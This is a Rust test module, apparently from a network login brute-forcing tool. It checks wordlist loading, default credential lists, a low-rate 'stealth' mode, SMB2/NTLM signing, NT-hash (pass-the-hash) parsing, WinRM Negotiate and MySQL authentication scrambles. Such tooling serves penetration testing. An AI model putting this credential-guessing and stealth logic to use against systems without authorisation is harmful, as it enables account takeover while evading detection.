    }

    #[test]
    fn test_load_wordlist_capped() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("big.txt");
        let content: String = (0..MAX_WORDLIST_ENTRIES + 50)
            .map(|i| format!("u{}\n", i))
            .collect();
        std::fs::write(&path, content).unwrap();

        let list = load_wordlist(path.to_str().unwrap()).unwrap();
        assert_eq!(list.len(), MAX_WORDLIST_ENTRIES);
    }

    #[test]
    fn test_brute_config_merge_then_replace() {
        let dir = tempfile::tempdir().unwrap();
        let users = dir.path().join("u.txt");
        let passes = dir.path().join("p.txt");
        std::fs::write(&users, "admin\nctf_user\n").unwrap(); // `admin` doublonne l'embarqué
        std::fs::write(&passes, "hunter2\n").unwrap();

        // Additif : l'embarqué est conservé, le fichier s'y ajoute sans doublon.
        let mut cfg = BruteConfig::quick();
        let base_users = cfg.usernames.len();
        assert!(cfg.usernames.contains(&"admin".to_string()));

        let (loaded, total) = cfg.load_users(users.to_str().unwrap(), false).unwrap();
        assert_eq!(loaded, 2);
        assert_eq!(total, base_users + 1); // seul `ctf_user` est nouveau
        assert!(cfg.usernames.contains(&"ctf_user".to_string()));
        assert!(cfg.usernames.contains(&"root".to_string())); // embarqué préservé

        let (loaded_p, total_p) = cfg.load_passwords(passes.to_str().unwrap(), false).unwrap();
        assert_eq!((loaded_p, total_p), (1, cfg.passwords.len()));
        assert!(cfg.passwords.contains(&"".to_string())); // mot de passe vide conservé

        // Remplacement : seule la liste du fichier subsiste.
        let (_, total) = cfg.load_users(users.to_str().unwrap(), true).unwrap();
        assert_eq!(total, 2);
        assert_eq!(
            cfg.usernames,
            vec!["admin".to_string(), "ctf_user".to_string()]
        );

        let (_, total_p) = cfg.load_passwords(passes.to_str().unwrap(), true).unwrap();
        assert_eq!(cfg.passwords, vec!["hunter2".to_string()]);

        // Un fichier illisible laisse la configuration intacte.
        let before = cfg.usernames.clone();
        assert!(cfg.load_users("definitely_absent.txt", true).is_err());
        assert_eq!(cfg.usernames, before);
    }

    #[test]
    fn test_stealth_config() {
        let cfg = BruteConfig::stealth();
        assert_eq!(cfg.delay_ms, 2000);
        assert_eq!(cfg.max_parallel, 1);
    }

    #[test]
    fn test_pg_md5_format() {
        let hash = pg_md5_password("postgres", "postgres", &[0x01, 0x02, 0x03, 0x04]);
        assert!(hash.starts_with("md5"));
        assert_eq!(hash.len(), 35); // "md5" + 32 hex chars
                                    // Verify the hash is a real MD5 (not the placeholder hex)
        let suffix = &hash[3..];
        assert!(suffix.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_mysql_version_extract() {
        // Simulate MySQL greeting: 3-byte len + seq + proto + version + \0
        let mut buf = vec![0u8; 4]; // packet header
        buf.push(0x0a); // protocol v10
        buf.extend_from_slice(b"8.0.32-MySQL Community Server\0");
        let ver = extract_mysql_version(&buf);
        assert_eq!(ver, "8.0.32-MySQL Community Server");
    }

    #[test]
    fn test_web_admin_paths_not_empty() {
        assert!(!web_admin_paths().is_empty());
        assert!(web_admin_paths().contains(&"/admin"));
    }

    // ── SMB2 / NTLM ──────────────────────────────────────────────────────────

    #[test]
    fn test_smb2_header_layout() {
        let h = smb2_header(SMB2_SESSION_SETUP, 7, 0x1122_3344_5566_7788);
        assert_eq!(h.len(), 64);
        assert_eq!(&h[0..4], &[0xFE, b'S', b'M', b'B']);
        assert_eq!(u16::from_le_bytes([h[4], h[5]]), 64); // StructureSize
        assert_eq!(u16::from_le_bytes([h[12], h[13]]), SMB2_SESSION_SETUP);
        assert_eq!(u64::from_le_bytes(h[24..32].try_into().unwrap()), 7);
        assert_eq!(smb2_session_id(&h), 0x1122_3344_5566_7788);
    }

    #[test]
    fn test_smb2_negotiate_request_311_contexts() {
        // Sel fixe (32 zéros) pour rendre la trame déterministe.
        let b = smb2_negotiate_request(&[0u8; 32]);
        assert_eq!(u16::from_le_bytes([b[0], b[1]]), 36); // StructureSize
        assert_eq!(u16::from_le_bytes([b[2], b[3]]), 5); // DialectCount
                                                         // NegotiateContextOffset = 64 (en-tête) + 48 (corps aligné) = 112.
        assert_eq!(u32::from_le_bytes([b[28], b[29], b[30], b[31]]), 112);
        assert_eq!(u16::from_le_bytes([b[32], b[33]]), 3); // NegotiateContextCount
                                                           // 3.1.1 en tête de liste, 2.0.2 en dernier.
        assert_eq!(u16::from_le_bytes([b[36], b[37]]), 0x0311);
        assert_eq!(u16::from_le_bytes([b[44], b[45]]), 0x0202);
        // Bourrage de 2 octets (36 + 10 = 46 → 48) avant les contextes.
        assert_eq!(&b[46..48], &[0, 0]);
        assert_eq!(b.len(), 128);

        // Contexte PREAUTH_INTEGRITY : SHA-512 + sel de 32 octets.
        assert_eq!(
            u16::from_le_bytes([b[48], b[49]]),
            SMB2_NEGO_CTX_PREAUTH_INTEGRITY
        );
        assert_eq!(u16::from_le_bytes([b[50], b[51]]), 40); // DataLength (6 + 32, aligné)
        assert_eq!(u16::from_le_bytes([b[56], b[57]]), 1); // HashAlgorithmCount
        assert_eq!(u16::from_le_bytes([b[58], b[59]]), 32); // SaltLength
        assert_eq!(u16::from_le_bytes([b[60], b[61]]), SMB2_PREAUTH_SHA512);

        // Contexte ENCRYPTION : AES-128-GCM proposé en premier.
        assert_eq!(u16::from_le_bytes([b[96], b[97]]), SMB2_NEGO_CTX_ENCRYPTION);
        assert_eq!(u16::from_le_bytes([b[98], b[99]]), 8); // DataLength
        assert_eq!(u16::from_le_bytes([b[104], b[105]]), 2); // CipherCount
        assert_eq!(u16::from_le_bytes([b[106], b[107]]), SMB2_CIPHER_AES128_GCM);
        assert_eq!(u16::from_le_bytes([b[108], b[109]]), SMB2_CIPHER_AES128_CCM);

        // Contexte SIGNING : AES-CMAC.
        assert_eq!(u16::from_le_bytes([b[112], b[113]]), SMB2_NEGO_CTX_SIGNING);
        assert_eq!(u16::from_le_bytes([b[120], b[121]]), 1); // SigningAlgorithmCount
        assert_eq!(u16::from_le_bytes([b[122], b[123]]), SMB2_SIGN_AES_CMAC);

        // Tous les contextes commencent sur une frontière de 8 octets.
        for off in [48usize, 96, 112] {
            assert_eq!(off % 8, 0);
        }
    }

    #[test]
    fn test_smb2_parse_negotiate_311_response() {
        // Réponse 3.1.1 synthétique : corps fixe (65) + 2 contextes.
        let mut m = vec![0u8; 168];
        m[64..66].copy_from_slice(&65u16.to_le_bytes()); // StructureSize
        m[66..68].copy_from_slice(&1u16.to_le_bytes()); // SecurityMode
        m[68..70].copy_from_slice(&SMB2_DIALECT_311.to_le_bytes()); // DialectRevision
        m[70..72].copy_from_slice(&2u16.to_le_bytes()); // NegotiateContextCount
        m[120..122].copy_from_slice(&128u16.to_le_bytes()); // SecurityBufferOffset
        m[124..128].copy_from_slice(&128u32.to_le_bytes()); // NegotiateContextOffset

        // PREAUTH_INTEGRITY : 1 algorithme (SHA-512) + sel serveur de 8 octets.
        m[128..130].copy_from_slice(&SMB2_NEGO_CTX_PREAUTH_INTEGRITY.to_le_bytes());
        m[130..132].copy_from_slice(&16u16.to_le_bytes()); // DataLength
        m[136..138].copy_from_slice(&1u16.to_le_bytes()); // HashAlgorithmCount
        m[138..140].copy_from_slice(&8u16.to_le_bytes()); // SaltLength
        m[140..142].copy_from_slice(&SMB2_PREAUTH_SHA512.to_le_bytes());
        m[142..150].copy_from_slice(&[0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8]);

        // ENCRYPTION : AES-128-GCM retenu.
        m[152..154].copy_from_slice(&SMB2_NEGO_CTX_ENCRYPTION.to_le_bytes());
        m[154..156].copy_from_slice(&8u16.to_le_bytes()); // DataLength
        m[160..162].copy_from_slice(&1u16.to_le_bytes()); // CipherCount
        m[162..164].copy_from_slice(&SMB2_CIPHER_AES128_GCM.to_le_bytes());

        let info = smb2_parse_negotiate(&m).unwrap();
        assert_eq!(info.dialect, SMB2_DIALECT_311);
        // `SecurityMode` = SIGNING_ENABLED : la signature pourra être éprouvée.
        assert_eq!(
            info.security_mode & SMB2_NEGOTIATE_SIGNING_ENABLED,
            SMB2_NEGOTIATE_SIGNING_ENABLED
        );
        assert_eq!(info.preauth_hash, Some(SMB2_PREAUTH_SHA512));
        assert_eq!(info.cipher, Some(SMB2_CIPHER_AES128_GCM));
        assert_eq!(
            info.server_salt,
            vec![0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8]
        );
        assert_eq!(smb2_cipher_label(SMB2_CIPHER_AES128_GCM), "AES-128-GCM");

        // Réponse d'un dialecte antérieur : aucun contexte, aucun panic.
        let mut old = vec![0u8; 80];
        old[68..70].copy_from_slice(&0x0302u16.to_le_bytes());
        let info = smb2_parse_negotiate(&old).unwrap();
        assert_eq!(info.dialect, 0x0302);
        assert_eq!(info.cipher, None);
        assert_eq!(info.preauth_hash, None);

        // Message trop court pour le dialecte.
        assert!(smb2_parse_negotiate(&[0u8; 40]).is_none());
    }

    #[test]
    fn test_smb2_preauth_integrity_hash_chaining() {
        use sha2::Digest;
        // Le hash doit *chaîner* les messages (pas réinitialiser à chaque appel).
        let mut h = PreauthIntegrityHash::new();
        for m in [&b"negotiate"[..], &b"response"[..], &b"session-setup"[..]] {
            h.update(m);
        }
        let mut direct = sha2::Sha512::new();
        direct.update(b"negotiate");
        direct.update(b"response");
        direct.update(b"session-setup");
        let chained = h.finalize();
        assert_eq!(chained.as_slice(), direct.finalize().as_slice());
        assert_eq!(chained.len(), 64); // SHA-512
    }

    #[test]
    fn test_aes_cmac_128_rfc4493_vectors() {
        let key: [u8; 16] = hex::decode("2b7e151628aed2a6abf7158809cf4f3c")
            .unwrap()
            .try_into()
            .unwrap();

        // Exemple 1 : message vide.
        assert_eq!(
            hex::encode(aes_cmac_128(&key, &[])),
            "bb1d6929e95937287fa37d129b756746"
        );

        // Exemple 2 : un bloc complet (16 octets).
        let m2 = hex::decode("6bc1bee22e409f96e93d7e117393172a").unwrap();
        assert_eq!(
            hex::encode(aes_cmac_128(&key, &m2)),
            "070a16b46b4d4144f79bdd9dd04a287c"
        );

        // Exemple 3 : 40 octets (dernier bloc incomplet → K2).
        let m3 = hex::decode(
            "6bc1bee22e409f96e93d7e117393172aae2d8a571e03ac9c9eb76fac45af8e5130c81c46a35ce411",
        )
        .unwrap();
        assert_eq!(
            hex::encode(aes_cmac_128(&key, &m3)),
            "dfa66747de9ae63030ca32611497c827"
        );

        // Exemple 4 : 64 octets (quatre blocs complets → K1).
        let m4 = hex::decode(concat!(
            "6bc1bee22e409f96e93d7e117393172aae2d8a571e03ac9c9eb76fac45af8e51",
            "30c81c46a35ce411e5fbc1191a0a52eff69f2445df4f9b17ad2b417be66c3710"
        ))
        .unwrap();
        assert_eq!(
            hex::encode(aes_cmac_128(&key, &m4)),
            "51f0bebf7e3b9d92fc49741779363cfe"
        );
    }

    #[test]
    fn test_smb2_kdf_counter_shape() {
        let sk = [0x11u8; 16];
        let ctx = [0x22u8; 64];

        // Longueur exacte demandée, résultat déterministe.
        let a = smb2_kdf_counter(&sk, b"SMBSigningKey", &ctx, 16);
        assert_eq!(a.len(), 16);
        assert_eq!(a, smb2_kdf_counter(&sk, b"SMBSigningKey", &ctx, 16));

        // Le label et le contexte participent tous deux à la dérivation.
        assert_ne!(
            a,
            smb2_kdf_counter(&sk, b"SMBSigningKey", &[0x33u8; 64], 16)
        );
        assert_ne!(a, smb2_kdf_counter(&sk, b"SMBC2SCipherKey", &ctx, 16));

        // Au-delà de 32 octets, un second bloc HMAC est concaténé. La longueur
        // demandée `L` entre dans l'entrée du PRF (SP800-108) : le préfixe d'une
        // dérivation de 48 octets diffère donc de la dérivation de 16 octets.
        let long = smb2_kdf_counter(&sk, b"SMBSigningKey", &ctx, 48);
        assert_eq!(long.len(), 48);
        assert_eq!(long, smb2_kdf_counter(&sk, b"SMBSigningKey", &ctx, 48));
        assert_ne!(&long[..16], a.as_slice());
        assert_ne!(
            &long[..32],
            smb2_kdf_counter(&sk, b"SMBSigningKey", &ctx, 32).as_slice()
        );

        // `smb2_signing_key` = KDF étiquetée « SMBSigningKey », 16 octets.
        let mut expect = [0u8; 16];
        expect.copy_from_slice(&a);
        assert_eq!(smb2_signing_key(&sk, &ctx), expect);
    }

    #[test]
    fn test_smb2_session_setup_body_offset() {
        let blob = [0xAAu8; 12];
        let b = smb2_session_setup_body(&blob);
        assert_eq!(u16::from_le_bytes([b[0], b[1]]), 25); // StructureSize
        assert_eq!(u16::from_le_bytes([b[12], b[13]]), 88); // SecurityBufferOffset
        assert_eq!(u16::from_le_bytes([b[14], b[15]]), 12); // SecurityBufferLength
        assert_eq!(&b[24..], &blob);
    }

    #[test]
    fn test_smb2_sign_marks_flag_and_writes_cmac() {
        let key: [u8; 16] = hex::decode("2b7e151628aed2a6abf7158809cf4f3c")
            .unwrap()
            .try_into()
            .unwrap();

        let mut msg = smb2_header(SMB2_TREE_CONNECT, 9, 0x0000_ABCD_0000_1234);
        msg.extend_from_slice(&smb2_tree_connect_body("\\\\srv\\IPC$"));

        // Référence : drapeau SIGNED posé puis AES-CMAC de la totalité du
        // message, signature laissée nulle ([MS-SMB2] §3.1.4.1).
        let mut expect_msg = msg.clone();
        let flags = u32::from_le_bytes([msg[16], msg[17], msg[18], msg[19]]) | SMB2_FLAGS_SIGNED;
        expect_msg[16..20].copy_from_slice(&flags.to_le_bytes());
        let expect = aes_cmac_128(&key, &expect_msg);

        let mut signed = msg.clone();
        smb2_sign(&mut signed, &key);

        assert_eq!(signed.len(), msg.len());
        assert_eq!(
            u32::from_le_bytes([signed[16], signed[17], signed[18], signed[19]])
                & SMB2_FLAGS_SIGNED,
            SMB2_FLAGS_SIGNED
        );
        assert_eq!(&signed[48..64], &expect[..]);
        // Seuls `Flags` (16..20) et `Signature` (48..64) changent.
        assert_eq!(&signed[..16], &msg[..16]);
        assert_eq!(&signed[20..48], &msg[20..48]);
        assert_eq!(&signed[64..], &msg[64..]);

        // Signature déterministe, sensible à la clé ; message trop court ignoré.
        let mut again = msg.clone();
        smb2_sign(&mut again, &key);
        assert_eq!(again, signed);
        assert_ne!(aes_cmac_128(&[0x33u8; 16], &expect_msg), expect);

        let mut tiny = [0u8; 32];
        smb2_sign(&mut tiny, &key);
        assert!(tiny.iter().all(|&b| b == 0));
    }

    #[test]
    fn test_smb2_tree_connect_body_layout() {
        let path = "\\\\srv\\IPC$";
        let b = smb2_tree_connect_body(path);
        assert_eq!(u16::from_le_bytes([b[0], b[1]]), 9); // StructureSize
        assert_eq!(u16::from_le_bytes([b[2], b[3]]), 0); // Flags
        assert_eq!(u16::from_le_bytes([b[4], b[5]]), 72); // PathOffset = 64 + 8
        assert_eq!(u16::from_le_bytes([b[6], b[7]]) as usize, path.len() * 2);
        assert_eq!(b.len(), 8 + path.len() * 2);

        // Chemin UNC en UTF-16LE.
        let units: Vec<u16> = b[8..]
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        assert_eq!(String::from_utf16(&units).unwrap(), path);
    }

    #[test]
    fn test_smb2_status_and_blob_extraction() {
        // Message synthétique : en-tête 64 octets + corps SESSION_SETUP.
        let mut msg = vec![0u8; 64];
        msg[8..12].copy_from_slice(&SMB2_STATUS_MORE_PROCESSING_REQUIRED.to_le_bytes());
        msg.extend_from_slice(&9u16.to_le_bytes()); // StructureSize
        msg.extend_from_slice(&0u16.to_le_bytes()); // SessionFlags
        msg.extend_from_slice(&72u16.to_le_bytes()); // SecurityBufferOffset
        msg.extend_from_slice(&3u16.to_le_bytes()); // SecurityBufferLength
        msg.extend_from_slice(&[0xDE, 0xAD, 0xBE]);
        assert_eq!(smb2_status(&msg), SMB2_STATUS_MORE_PROCESSING_REQUIRED);
        assert_eq!(smb2_session_setup_blob(&msg), vec![0xDE, 0xAD, 0xBE]);
        // Un offset hors bornes ne doit jamais paniquer.
        let mut bad = msg.clone();
        bad[68..70].copy_from_slice(&60000u16.to_le_bytes());
        assert!(smb2_session_setup_blob(&bad).is_empty());
    }

    #[test]
    fn test_split_domain_account() {
        assert_eq!(
            split_domain_account("CORP\\alice"),
            ("CORP".into(), "alice".into())
        );
        assert_eq!(
            split_domain_account("alice@corp.local"),
            ("corp.local".into(), "alice".into())
        );
        assert_eq!(
            split_domain_account("alice"),
            (String::new(), "alice".into())
        );
    }

    #[test]
    fn test_avpair_domain_extraction() {
        // AvPairs : MsvAvNbComputerName (1), MsvAvNbDomainName (2), AV_EOL (0).
        let mut ti = Vec::new();
        let comp = "SRV01"
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect::<Vec<u8>>();
        let dom = "CORP"
            .encode_utf16()
            .flat_map(|u| u.to_le_bytes())
            .collect::<Vec<u8>>();
        ti.extend_from_slice(&1u16.to_le_bytes());
        ti.extend_from_slice(&(comp.len() as u16).to_le_bytes());
        ti.extend_from_slice(&comp);
        ti.extend_from_slice(&2u16.to_le_bytes());
        ti.extend_from_slice(&(dom.len() as u16).to_le_bytes());
        ti.extend_from_slice(&dom);
        ti.extend_from_slice(&[0u8; 4]); // AV_EOL

        assert_eq!(avpair_domain(&ti), Some("CORP".to_string()));
        assert_eq!(avpair_domain(&[]), None);
    }

    #[test]
    fn test_parse_nt_hash() {
        // Vecteur connu : "password" → NT hash.
        let h = parse_nt_hash("8846F7EAEE8FB117AD06BDD830B7586C").unwrap();
        assert_eq!(h, crate::ntlm::nt_hash("password"));
        assert_eq!(
            parse_nt_hash("8846f7eaee8fb117ad06bdd830b7586c").unwrap(),
            h
        );
        // Rejets : longueur, caractères non hexadécimaux, mot de passe court.
        assert!(parse_nt_hash("abcd").is_none());
        assert!(parse_nt_hash("zz46f7eaee8fb117ad06bdd830b7586c").is_none());
        assert!(parse_nt_hash("Password123!").is_none());
    }

    #[test]
    fn test_smb2_status_outcome_mapping() {
        assert!(matches!(
            smb2_status_outcome(SMB2_STATUS_LOGON_FAILURE),
            AttemptOutcome::Failure
        ));
        assert!(matches!(
            smb2_status_outcome(SMB2_STATUS_WRONG_PASSWORD),
            AttemptOutcome::Failure
        ));
        assert!(matches!(
            smb2_status_outcome(SMB2_STATUS_ACCOUNT_LOCKED_OUT),
            AttemptOutcome::Locked(_)
        ));
        assert!(matches!(
            smb2_status_outcome(SMB2_STATUS_ACCOUNT_DISABLED),
            AttemptOutcome::Locked(_)
        ));
        assert!(matches!(
            smb2_status_outcome(0xDEAD_BEEF),
            AttemptOutcome::Failure
        ));
    }

    // ── WinRM Negotiate ──────────────────────────────────────────────────────

    #[test]
    fn test_find_subslice() {
        assert_eq!(find_subslice(b"abcdef", b"cd"), Some(2));
        assert_eq!(find_subslice(b"abcdef", b"ab"), Some(0));
        assert_eq!(find_subslice(b"abcdef", b"zz"), None);
        assert_eq!(find_subslice(b"abc", b""), None); // aiguille vide
        assert_eq!(find_subslice(b"ab", b"abcdef"), None); // aiguille trop longue
    }

    #[test]
    fn test_winrm_http_post_layout() {
        let soap = WINRM_IDENTIFY_SOAP;
        let req = http_post_wsman("10.0.0.5", 5985, "TlRMTVNTUAAB", soap);
        // La ligne de requête et un en-tête Host corrects.
        assert!(req.starts_with(b"POST /wsman HTTP/1.1\r\n"));
        let head_len = find_subslice(&req, b"\r\n\r\n").expect("fin d'en-têtes") + 4;
        let head = String::from_utf8_lossy(&req[..head_len]);
        assert!(head.contains("Host: 10.0.0.5:5985\r\n"));
        assert!(head.contains("Authorization: Negotiate TlRMTVNTUAAB\r\n"));
        assert!(head.contains("Connection: keep-alive\r\n"));
        assert!(head.contains(&format!("Content-Length: {}\r\n", soap.len())));
        // Le corps suit exactement les en-têtes et fait la taille annoncée.
        assert_eq!(&req[head_len..], soap.as_bytes());
    }

    #[test]
    fn test_www_authenticate_token() {
        use base64::Engine;
        let raw = [0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50]; // "NTLMSSP"
        let b64 = base64::engine::general_purpose::STANDARD.encode(raw);

        let mut h = HashMap::new();
        h.insert("www-authenticate".into(), format!("Negotiate {}", b64));
        assert_eq!(www_authenticate_token(&h).as_deref(), Some(raw.as_slice()));

        // Schéma NTLM (variante non SPNEGO) accepté, casse ignorée.
        h.insert("www-authenticate".into(), format!("NTLM {}", b64));
        assert_eq!(www_authenticate_token(&h).as_deref(), Some(raw.as_slice()));

        // Schéma inconnu / base64 invalide / en-tête absent → None.
        h.insert("www-authenticate".into(), "Basic realm=x".into());
        assert!(www_authenticate_token(&h).is_none());
        h.insert("www-authenticate".into(), "Negotiate not*base64!".into());
        assert!(www_authenticate_token(&h).is_none());
        h.remove("www-authenticate");
        assert!(www_authenticate_token(&h).is_none());
    }

    #[tokio::test]
    async fn test_http_read_response_content_length() {
        let (mut client, mut server) = tokio::io::duplex(8192);
        let resp = b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\nContent-Type: text/plain\r\n\r\nhello";
        server.write_all(resp).await.unwrap();

        let (code, headers, body) = http_read_response(&mut client, Duration::from_secs(2))
            .await
            .expect("réponse lisible");
        assert_eq!(code, 200);
        assert_eq!(headers.get("content-length").map(String::as_str), Some("5"));
        assert_eq!(
            headers.get("content-type").map(String::as_str),
            Some("text/plain")
        );
        assert_eq!(body, b"hello");
    }

    #[tokio::test]
    async fn test_http_read_response_401_negotiate() {
        use base64::Engine;
        let raw = [0xAAu8, 0xBB, 0xCC];
        let b64 = base64::engine::general_purpose::STANDARD.encode(raw);
        let (mut client, mut server) = tokio::io::duplex(8192);
        let resp = format!(
            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Negotiate {}\r\nContent-Length: 0\r\n\r\n",
            b64
        );
        server.write_all(resp.as_bytes()).await.unwrap();

        let (code, headers, _) = http_read_response(&mut client, Duration::from_secs(2))
            .await
            .expect("réponse lisible");
        assert_eq!(code, 401);
        // Le jeton est bien extrait de la réponse capturée.
        assert_eq!(
            www_authenticate_token(&headers).as_deref(),
            Some(raw.as_slice())
        );
    }

    #[tokio::test]
    async fn test_http_read_response_chunked() {
        let (mut client, mut server) = tokio::io::duplex(8192);
        let resp = b"HTTP/1.1 500 Internal Server Error\r\n\
                     Transfer-Encoding: chunked\r\n\r\n\
                     5\r\nhello\r\n0\r\n\r\n";
        server.write_all(resp).await.unwrap();

        let (code, headers, body) = http_read_response(&mut client, Duration::from_secs(2))
            .await
            .expect("réponse lisible");
        assert_eq!(code, 500);
        assert!(headers
            .get("transfer-encoding")
            .unwrap()
            .contains("chunked"));
        // Le corps chunked est entièrement consommé (la connexion reste réutilisable).
        assert!(body.windows(5).any(|w| w == b"hello".as_slice()));
    }

    #[tokio::test]
    async fn test_http_read_response_eof_is_none() {
        let (mut client, server) = tokio::io::duplex(64);
        drop(server); // EOF immédiat : aucune ligne d'état
        assert!(http_read_response(&mut client, Duration::from_secs(2))
            .await
            .is_none());
    }

    // ── MySQL (handshake v10) ────────────────────────────────────────────────

    /// Sel de référence commun aux deux vecteurs : 01 02 … 14.
    fn mysql_kat_nonce() -> Vec<u8> {
        (1u8..=20).collect()
    }

    #[test]
    fn test_mysql_native_scramble_kat() {
        // Vecteur calculé hors ligne (SHA-1 sur « password » + ce sel).
        let expected = hex::decode("C17D6009A5CB47E59F7483FCF05553BBBF7DD0D6").unwrap();
        assert_eq!(
            mysql_scramble_native("password", &mysql_kat_nonce()),
            expected
        );
        assert_eq!(expected.len(), 20);
        // Mot de passe vide → réponse vide (le serveur attend 0 octet).
        assert!(mysql_scramble_native("", &mysql_kat_nonce()).is_empty());
        // Un autre sel doit donner une réponse différente (le sel est bien utilisé).
        let other = mysql_scramble_native("password", &[0u8; 20]);
        assert_ne!(other, expected);
    }

    #[test]
    fn test_mysql_caching_sha2_scramble_kat() {
        let expected =
            hex::decode("F7AB1C623A6E98DCEAB35E926290E5746A3141116115F4DD8CCCA994393ECCDD")
                .unwrap();
        assert_eq!(
            mysql_scramble_caching_sha2("password", &mysql_kat_nonce()),
            expected
        );
        assert_eq!(expected.len(), 32);
        assert!(mysql_scramble_caching_sha2("", &mysql_kat_nonce()).is_empty());
    }

    #[test]
    fn test_mysql_auth_response_plugin_dispatch() {
        let nonce = mysql_kat_nonce();
        assert_eq!(
            mysql_auth_response("mysql_native_password", "password", &nonce).len(),
            20
        );
        assert_eq!(
            mysql_auth_response("caching_sha2_password", "password", &nonce).len(),
            32
        );
        assert_eq!(mysql_auth_response("", "password", &nonce).len(), 20);
        // Plugin inconnu : réponse vide, jamais un succès inventé.
        assert!(mysql_auth_response("sha256_password", "password", &nonce).is_empty());
        assert!(mysql_auth_response("ed25519", "password", &nonce).is_empty());
    }

    #[test]
    fn test_mysql_full_auth_plaintext_kat() {
        // mot de passe NUL-terminé puis XOR cyclique avec le sel.
        // "abc" (0x61 0x62 0x63) + 0x00, sel = [0x01, 0x02, 0x03]
        // → 0x61^01=0x60, 0x62^02=0x60, 0x63^03=0x60, 0x00^01=0x01
        assert_eq!(
            mysql_full_auth_plaintext("abc", &[0x01, 0x02, 0x03]),
            vec![0x60, 0x60, 0x60, 0x01]
        );
        // Mot de passe vide : seul le terminateur, XOR-é avec le premier octet.
        assert_eq!(mysql_full_auth_plaintext("", &[0xFF]), vec![0xFF]);
        // Sel vide : simple NUL-terminaison.
        assert_eq!(mysql_full_auth_plaintext("ab", &[]), vec![0x61, 0x62, 0x00]);
    }

    #[test]
    fn test_mysql_greeting_parse() {
        let mut p = vec![0x0A];
        p.extend_from_slice(b"8.0.32-community\0");
        p.extend_from_slice(&0x0A0B_0C0Du32.to_le_bytes()); // connection id
        p.extend_from_slice(&(1u8..=8).collect::<Vec<u8>>()); // auth-plugin-data part 1
        p.push(0x00); // filler
                      // CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION
        p.extend_from_slice(&(0x0200u16 | 0x8000).to_le_bytes());
        p.push(0x21); // charset
        p.extend_from_slice(&0x0002u16.to_le_bytes()); // status flags
        p.extend_from_slice(&0x0008u16.to_le_bytes()); // CLIENT_PLUGIN_AUTH
        p.push(21); // auth_plugin_data_len
        p.extend_from_slice(&[0u8; 10]); // reserved
        p.extend_from_slice(&(9u8..=20).collect::<Vec<u8>>()); // part 2 (12 octets)
        p.push(0x00); // terminateur du sel
        p.extend_from_slice(b"caching_sha2_password\0");

        let g = parse_mysql_greeting(&p).expect("greeting v10 valide");
        assert_eq!(g.server_version, "8.0.32-community");
        assert_eq!(g.auth_plugin, "caching_sha2_password");
        assert_eq!(g.nonce, mysql_kat_nonce()); // 8 + 12 = 20 octets
        assert!(g.capabilities & MYSQL_CLIENT_PLUGIN_AUTH != 0);

        // Robustesse : un paquet tronqué ne doit jamais paniquer.
        assert!(parse_mysql_greeting(&[]).is_none());
        assert!(parse_mysql_greeting(&[0x09, 0x00]).is_none()); // protocole v9
        assert!(parse_mysql_greeting(&p[..20]).is_none());
    }

    #[test]
    fn test_mysql_packet_framing() {
        let pkt = mysql_packet(7, &[0xAA; 300]);
        assert_eq!(pkt.len(), 304);
        assert_eq!(pkt[0], 0x2C); // 300 & 0xFF
        assert_eq!(pkt[1], 0x01); // (300 >> 8) & 0xFF
        assert_eq!(pkt[2], 0x00);
        assert_eq!(pkt[3], 7); // séquence
        assert_eq!(&pkt[4..], &[0xAA; 300][..]);
    }

    #[test]
    fn test_mysql_error_text_skips_sqlstate() {
        // 0xFF | 1045 (LE) | '#' | "28000" | "Access denied for user"
        let mut body = vec![0xFF];
        body.extend_from_slice(&1045u16.to_le_bytes());
        body.push(b'#');
        body.extend_from_slice(b"28000Access denied for user 'root'");
        assert_eq!(mysql_error_text(&body), "Access denied for user 'root'");
        assert_eq!(u16::from_le_bytes([body[1], body[2]]), 1045);

        // Variante sans SQLSTATE (serveur ancien) : le message suit le code.
        let short = [0xFF, 0x69, 0x04, b'n', b'o', b'p', b'e'];
        assert_eq!(mysql_error_text(&short), "nope");
    }

    #[test]
    fn test_mysql_handshake_response_layout() {
        let auth = [0xABu8; 20];
        let caps = 0x0200u32 | 0x8000 | MYSQL_CLIENT_PLUGIN_AUTH;
        let r = mysql_handshake_response("root", &auth, "mysql_native_password", caps, false);

        let flags = u32::from_le_bytes(r[0..4].try_into().unwrap());
        assert!(flags & MYSQL_CLIENT_PROTOCOL_41 != 0);
        assert!(flags & MYSQL_CLIENT_SECURE_CONNECTION != 0);
        assert!(flags & MYSQL_CLIENT_PLUGIN_AUTH != 0);
        assert_eq!(&r[32..37], b"root\0"); // 4 + 4 + 1 + 23
        assert_eq!(r[37], 20); // longueur de la réponse
        assert_eq!(&r[38..58], &auth[..]);
        assert_eq!(&r[58..], b"mysql_native_password\0");

        // Serveur sans CLIENT_PLUGIN_AUTH : le nom du plugin est omis.
        let no_plugin =
            mysql_handshake_response("root", &[], "mysql_native_password", 0x8200, false);
        assert_eq!(no_plugin.len(), 32 + 5 + 1);
        assert_eq!(no_plugin[37], 0);

        // Canal chiffré : `CLIENT_SSL` est ré-annoncé dans la réponse.
        let tls = mysql_handshake_response("root", &auth, "mysql_native_password", caps, true);
        let tflags = u32::from_le_bytes(tls[0..4].try_into().unwrap());
        assert!(tflags & MYSQL_CLIENT_SSL != 0);
        assert_eq!(tflags & !MYSQL_CLIENT_SSL, flags); // seul ce bit change
    }

    #[test]
    fn test_mysql_ssl_request_layout() {
        let caps = MYSQL_CLIENT_PROTOCOL_41
            | MYSQL_CLIENT_SECURE_CONNECTION
            | MYSQL_CLIENT_SSL
            | MYSQL_CLIENT_PLUGIN_AUTH;
        let r = mysql_ssl_request(caps);
        // Le `SSLRequest` s'arrête aux 23 octets réservés : aucun nom d'utilisateur.
        assert_eq!(r.len(), 32);
        let flags = u32::from_le_bytes(r[0..4].try_into().unwrap());
        assert!(flags & MYSQL_CLIENT_SSL != 0);
        assert!(flags & MYSQL_CLIENT_PLUGIN_AUTH != 0);
